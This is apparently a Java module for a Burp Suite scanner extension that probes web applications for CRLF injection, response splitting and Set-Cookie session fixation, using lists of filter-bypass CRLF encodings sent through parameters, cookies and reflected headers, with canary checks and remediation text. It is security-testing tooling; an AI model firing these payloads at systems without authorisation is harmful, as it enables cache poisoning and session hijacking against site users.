package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;

import com.omnistrike.model.*;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * CRLF Injection Scanner
 *
 * Detects HTTP response splitting and header injection by injecting CRLF sequences
 * into parameters and HTTP headers. Tests 4 attack scenarios:
 *   Phase 1: Header injection via query/body parameters (inject CRLF + canary header)
 *   Phase 2: Response splitting via parameters (double CRLF to end headers)
 *   Phase 3: Header injection via reflected HTTP headers (X-Forwarded-For, Referer, etc.)
 *   Phase 4: Set-Cookie injection for session fixation
 */
public class CrlfInjectionScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // Canary value used to confirm injection
    private static final String CANARY = "omnistrike-crlf-" + System.currentTimeMillis();

    // Headers commonly reflected in responses, used for Phase 3
    private static final String[] REFLECTED_HEADERS = {
            "X-Forwarded-For",
            "Referer",
            "User-Agent",
            "X-Custom-Header",
    };

    // CRLF payloads with encoding variants to bypass filters (Phase 1 & 4)
    private static final String[] CRLF_PREFIXES = {
            "%0d%0a",                       // Standard URL-encoded CRLF
            "%0a",                          // LF only
            "%0d",                          // CR only
            "%e5%98%8a%e5%98%8d",           // UTF-8 overlong encoding
            "%00%0d%0a",                    // Null byte prefix
            "\\r\\n",                       // Literal backslash (some parsers interpret)
            "%0d%0a%20",                    // CRLF + space (line folding)
            "%0d%0a%09",                    // CRLF + tab (line folding)
    };

    @Override
    public String getId() { return "crlf-injection"; }

    @Override
    public String getName() { return "CRLF Injection Scanner"; }

    @Override
    public String getDescription() {
        return "Detects CRLF injection / HTTP response splitting: header injection via parameters, "
                + "response splitting, reflected header injection, and Set-Cookie injection for session fixation.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());

        // Extract all testable parameters
        List<CrlfTarget> targets = extractTargets(request);

        for (CrlfTarget target : targets) {
            if (!dedup.markIfNew("crlf-injection", urlPath, target.name)) continue;

            try {
                String url = request.url();

                // Phase 1: Header injection via parameters
                if (config.getBool("crlf.headerInjection.enabled", true)) {
                    testHeaderInjectionViaParam(requestResponse, target, url);
                }

                // Phase 2: Response splitting via parameters
                if (config.getBool("crlf.responseSplitting.enabled", true)) {
                    testResponseSplitting(requestResponse, target, url);
                }

                // Phase 4: Set-Cookie injection (session fixation)
                if (config.getBool("crlf.setCookieInjection.enabled", true)) {
                    testSetCookieInjection(requestResponse, target, url);
                }

            } catch (Exception e) {
                api.logging().logToError("CRLF injection test error on " + target.name + ": " + e.getMessage());
            }
        }

        // Phase 3: Header injection via HTTP headers (dedup per URL path only)
        if (config.getBool("crlf.headerReflection.enabled", true)) {
            if (dedup.markIfNew("crlf-injection", urlPath, "__http_headers__")) {
                try {
                    testHeaderInjectionViaHeaders(requestResponse, requestResponse.request().url());
                } catch (Exception e) {
                    api.logging().logToError("CRLF header reflection test error: " + e.getMessage());
                }
            }
        }

        return Collections.emptyList();
    }

    // ==================== PHASE 1: HEADER INJECTION VIA PARAMETERS ====================

    private void testHeaderInjectionViaParam(HttpRequestResponse original, CrlfTarget target, String url)
            throws InterruptedException {
        for (String prefix : CRLF_PREFIXES) {
            String payload = target.originalValue + prefix + "X-Injected:%20" + CANARY;
            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            // Check if the canary header appears in the response headers
            String injectedValue = getResponseHeader(result, "X-Injected");
            if (injectedValue != null && injectedValue.contains(CANARY)) {
                findingsStore.addFinding(Finding.builder("crlf-injection",
                                "CRLF Injection: Header Injection via Parameter",
                                Severity.HIGH, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + describePrefixEncoding(prefix) + " | "
                                + "Injected header X-Injected: " + CANARY + " appeared in response headers")
                        .description("The parameter '" + target.name + "' is vulnerable to CRLF injection. "
                                + "By injecting a CRLF sequence (" + describePrefixEncoding(prefix) + "), "
                                + "an attacker can inject arbitrary HTTP response headers. This can lead to "
                                + "cache poisoning, XSS via header injection, session fixation, and other "
                                + "response manipulation attacks.")
                        .remediation("Sanitize all user input before including it in HTTP response headers. "
                                + "Strip or reject CR (\\r, %0d) and LF (\\n, %0a) characters from any "
                                + "value reflected in headers. Use a web framework that auto-encodes header values.")
                        .requestResponse(result)
                        .build());
                return; // One confirmed finding per parameter is enough
            }
            perHostDelay();
        }
    }

    // ==================== PHASE 2: RESPONSE SPLITTING ====================

    private void testResponseSplitting(HttpRequestResponse original, CrlfTarget target, String url)
            throws InterruptedException {
        // Double CRLF = end of headers, then body content injection
        String splitCanary = "omnistrike-split-" + System.currentTimeMillis();
        String[] splitPayloads = {
                target.originalValue + "%0d%0a%0d%0a" + splitCanary,
                target.originalValue + "%0a%0a" + splitCanary,
                target.originalValue + "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d" + splitCanary,
        };

        for (String payload : splitPayloads) {
            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            // Skip error responses — canary in error body is not response splitting
            if (result.response().statusCode() >= 400) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body != null && body.contains(splitCanary)) {
                // Confirm: canary must appear at the very start of the body (true response splitting)
                int canaryPos = body.indexOf(splitCanary);
                boolean atStart = canaryPos < 10;

                if (atStart) {
                    findingsStore.addFinding(Finding.builder("crlf-injection",
                                    "CRLF Injection: HTTP Response Splitting",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload injected double CRLF + canary '" + splitCanary + "' | "
                                    + "Canary appeared at position " + canaryPos + " in response body "
                                    + "(before expected HTML content)")
                            .description("The parameter '" + target.name + "' is vulnerable to full HTTP "
                                    + "response splitting. By injecting a double CRLF sequence, an attacker "
                                    + "can terminate the HTTP response headers and inject arbitrary body content. "
                                    + "This enables complete response hijacking, XSS, cache poisoning, and "
                                    + "serving malicious content to other users via cache.")
                            .remediation("Sanitize all user input before including it in HTTP responses. "
                                    + "Strip CR and LF characters from any value used in headers or redirects. "
                                    + "Use framework-provided redirect functions that properly encode values.")
                            .requestResponse(result)
                            .build());
                    return;
                }
            }
            perHostDelay();
        }
    }

    // ==================== PHASE 3: HEADER INJECTION VIA HTTP HEADERS ====================

    private void testHeaderInjectionViaHeaders(HttpRequestResponse original, String url)
            throws InterruptedException {
        for (String header : REFLECTED_HEADERS) {
            // Standard CRLF + canary in header value
            String payload = "127.0.0.1%0d%0aX-Injected:%20" + CANARY;
            try {
                HttpRequest modified = original.request()
                        .withRemovedHeader(header)
                        .withAddedHeader(header, payload);
                HttpRequestResponse result = api.http().sendRequest(modified);
                if (result == null || result.response() == null) continue;

                // Skip error responses — server may echo input in error pages, not actual CRLF
                if (result.response().statusCode() >= 400) continue;

                String injectedValue = getResponseHeader(result, "X-Injected");
                if (injectedValue != null && injectedValue.contains(CANARY)) {
                    findingsStore.addFinding(Finding.builder("crlf-injection",
                                    "CRLF Injection via HTTP Header: " + header,
                                    Severity.MEDIUM, Confidence.FIRM)
                            .url(url).parameter(header)
                            .evidence("Header " + header + " with CRLF payload | "
                                    + "Injected X-Injected: " + CANARY + " appeared in response headers")
                            .description("The HTTP header '" + header + "' is reflected in the response "
                                    + "and is vulnerable to CRLF injection. An attacker can inject arbitrary "
                                    + "response headers by including CRLF sequences in the header value. "
                                    + "This is exploitable when upstream proxies or load balancers pass "
                                    + "these headers to the application without sanitization.")
                            .remediation("Do not reflect HTTP header values in response headers without "
                                    + "sanitizing CR/LF characters. Configure reverse proxies to strip "
                                    + "or sanitize these headers before forwarding to the application.")
                            .requestResponse(result)
                            .build());
                    // Found one — skip remaining headers to reduce noise
                    return;
                }
            } catch (Exception e) {
                api.logging().logToError("CRLF header reflection test failed for " + header + ": " + e.getMessage());
            }
            perHostDelay();
        }
    }

    // ==================== PHASE 4: SET-COOKIE INJECTION (SESSION FIXATION) ====================

    private void testSetCookieInjection(HttpRequestResponse original, CrlfTarget target, String url)
            throws InterruptedException {
        String cookieCanary = "omnistrike=" + CANARY;
        String[] payloads = {
                target.originalValue + "%0d%0aSet-Cookie:%20" + cookieCanary,
                target.originalValue + "%0a%0dSet-Cookie:%20" + cookieCanary,
                target.originalValue + "%e5%98%8a%e5%98%8dSet-Cookie:%20" + cookieCanary,
        };

        for (String payload : payloads) {
            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            // Check if a Set-Cookie header with our canary was injected
            for (var h : result.response().headers()) {
                if (h.name().equalsIgnoreCase("Set-Cookie") && h.value().contains("omnistrike=" + CANARY)) {
                    findingsStore.addFinding(Finding.builder("crlf-injection",
                                    "CRLF Injection: Set-Cookie Injection (Session Fixation)",
                                    Severity.HIGH, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Injected Set-Cookie: " + cookieCanary + " appeared in response headers")
                            .description("The parameter '" + target.name + "' allows CRLF injection that "
                                    + "enables arbitrary Set-Cookie header injection. An attacker can "
                                    + "force a victim's browser to set a cookie with an attacker-controlled "
                                    + "value, enabling session fixation attacks. The attacker pre-sets the "
                                    + "session ID, waits for the victim to authenticate, then hijacks the session.")
                            .remediation("Sanitize all user input before including it in HTTP response headers. "
                                    + "Strip CR and LF characters. Implement proper session management that "
                                    + "regenerates session IDs after authentication.")
                            .requestResponse(result)
                            .build());
                    return;
                }
            }
            perHostDelay();
        }
    }

    // ==================== PARAMETER EXTRACTION ====================

    private List<CrlfTarget> extractTargets(HttpRequest request) {
        List<CrlfTarget> targets = new ArrayList<>();

        for (var param : request.parameters()) {
            switch (param.type()) {
                case URL:
                    targets.add(new CrlfTarget(param.name(), param.value(), TargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new CrlfTarget(param.name(), param.value(), TargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new CrlfTarget(param.name(), param.value(), TargetType.COOKIE));
                    break;
            }
        }

        return targets;
    }

    // ==================== REQUEST HELPERS ====================

    private HttpRequestResponse sendPayload(HttpRequestResponse original, CrlfTarget target, String payload) {
        try {
            HttpRequest modified = injectPayload(original.request(), target, payload);
            return api.http().sendRequest(modified);
        } catch (Exception e) {
            return null;
        }
    }

    private HttpRequest injectPayload(HttpRequest request, CrlfTarget target, String payload) {
        switch (target.type) {
            case QUERY:
                return request.withUpdatedParameters(
                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
            case BODY:
                return request.withUpdatedParameters(
                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
            case COOKIE:
                return request.withUpdatedParameters(
                        HttpParameter.cookieParameter(target.name, payload));
            default:
                return request;
        }
    }

    // ==================== RESPONSE HELPERS ====================

    /**
     * Retrieve a specific response header value (case-insensitive).
     */
    private String getResponseHeader(HttpRequestResponse response, String headerName) {
        for (var h : response.response().headers()) {
            if (h.name().equalsIgnoreCase(headerName)) {
                return h.value();
            }
        }
        return null;
    }

    /**
     * Human-readable description of the CRLF encoding variant used.
     */
    private String describePrefixEncoding(String prefix) {
        switch (prefix) {
            case "%0d%0a":                       return "standard URL-encoded CRLF (%0d%0a)";
            case "%0a":                          return "LF only (%0a)";
            case "%0d":                          return "CR only (%0d)";
            case "%e5%98%8a%e5%98%8d":           return "UTF-8 overlong CRLF";
            case "%00%0d%0a":                    return "null byte prefix + CRLF (%00%0d%0a)";
            case "\\r\\n":                       return "literal backslash-r-n (\\r\\n)";
            case "%0d%0a%20":                    return "CRLF + space (line folding)";
            case "%0d%0a%09":                    return "CRLF + tab (line folding)";
            default:                             return prefix;
        }
    }

    // ==================== GENERAL HELPERS ====================

    private String extractPath(String url) {
        try {
            if (url.contains("://")) url = url.substring(url.indexOf("://") + 3);
            int s = url.indexOf('/');
            if (s >= 0) { int q = url.indexOf('?', s); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("crlf.perHostDelay", 300);
        if (delay > 0) Thread.sleep(delay);
    }

    @Override
    public void destroy() { }

    // ==================== INNER TYPES ====================

    private enum TargetType { QUERY, BODY, COOKIE }

    private static class CrlfTarget {
        final String name, originalValue;
        final TargetType type;

        CrlfTarget(String n, String v, TargetType t) {
            name = n;
            originalValue = v != null ? v : "";
            type = t;
        }

        @Override
        public boolean equals(Object o) {
            if (this == o) return true;
            if (!(o instanceof CrlfTarget)) return false;
            CrlfTarget t = (CrlfTarget) o;
            return name.equals(t.name) && type == t.type;
        }

        @Override
        public int hashCode() { return Objects.hash(name, type); }
    }
}
